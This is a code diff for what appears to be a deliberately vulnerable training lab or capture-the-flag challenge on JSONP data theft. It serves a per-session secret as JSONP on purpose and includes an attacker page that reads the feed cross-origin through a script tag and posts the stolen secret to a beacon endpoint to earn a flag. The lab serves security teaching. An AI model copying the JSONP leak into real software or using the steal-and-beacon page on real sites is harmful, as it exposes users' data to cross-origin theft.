@@ -7,7 +7,8 @@
 // secret this session's feed served, so the feed must actually be loaded.
 // NOTE: jsonpSecret lives in modules/jsonp/shared.js (placed by the finisher).
 const express = require('express');
-const { jsonpSecret } = require('../shared');
+const { jsonpSecretShares } = require('../shared');
+const { COMBINE_HEX_JS } = require('../../../lib/jstoken');
 const { award, captured } = require('../../../lib/flags');
 const { brief, esc, page, hintLadder, toolsPill } = require('../../../lib/page');
 
@@ -18,7 +19,7 @@ const vuln = {
   name: 'JSONP Data Theft',
   difficulty: 'Medium',
   hint: 'Classic script tags ignore the Same-Origin Policy. Open the attacker page and watch it steal the feed.',
-  hints: ["Proxy your browser through Burp and open /jsonp/attacker. In Proxy history you will see a script tag pull the victim feed cross-origin.", "Open the /jsonp/data response in Proxy: the callback argument carries the user's data, including the per-session secret.", "Find the POST to /jsonp/beacon in Proxy history, send it to Repeater, and replay it: the response carries the flag."],
+  hints: ["Proxy your browser through Burp and open /jsonp/attacker. In Proxy history you will see a script tag pull the victim feed cross-origin.", "Open the /jsonp/data response in Proxy: the callback argument carries the user's data, including the per-session secret split into two share fields (sA and sK) that only executing code can combine.", "Find the POST to /jsonp/beacon in Proxy history, send it to Repeater, and replay it: the response carries the flag."],
   tools: "BZ, B",
   how: 'Load /jsonp/attacker in a browser proxied through Burp: the page pulls /jsonp/data with a script tag and beacons the stolen secret to /jsonp/beacon. The beacon response awards the flag, and replaying it in Repeater works too.',
   link: '/jsonp#csrf-data',
@@ -32,7 +33,8 @@ router.get('/data', (req, res) => {
   // VULN: sensitive data is served as JSONP, readable cross-origin by any
   // page via a script tag. The secret is per-session: the beacon only accepts
   // the secret this session's feed actually served.
-  res.send(`${cb}({"user":"alice","email":"alice@example.com","secret":"${jsonpSecret(req)}"});`);
+  const shares = jsonpSecretShares(req);
+  res.send(`${cb}({\"user\":\"alice\",\"email\":\"alice@example.com\",\"sA\":\"${shares.pxa}\",\"sK\":\"${shares.pxk}\"});`);
 });
 
 // Attacker page (evil.example): steals the JSONP feed cross-origin and beacons it.
@@ -52,13 +54,17 @@ router.get('/attacker', (req, res) => {
       <pre><code>${esc('<script src="/jsonp/data?callback=steal"></script>')}</code></pre>
       <p id="status" class="note">Waiting for the JSONP response...</p>
       <script>
+        ${COMBINE_HEX_JS}
         function steal(d) {
           document.getElementById('status').textContent =
             'Got data for ' + d.user + '; beaconing it to /jsonp/beacon ...';
+          // The feed carries the secret only as two share fields; code that
+          // actually runs the feed combines them at runtime.
+          var secret = combineHex(d.sA, d.sK);
           fetch('/jsonp/beacon', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(d)
+            body: JSON.stringify({ secret: secret })
           }).then(function (r) { return r.json(); }).then(function (j) {
             document.getElementById('status').innerHTML = j.ok
               ? 'Beacon accepted. Flag: <code>' + j.flag + '</code> (saved to your scoreboard)'
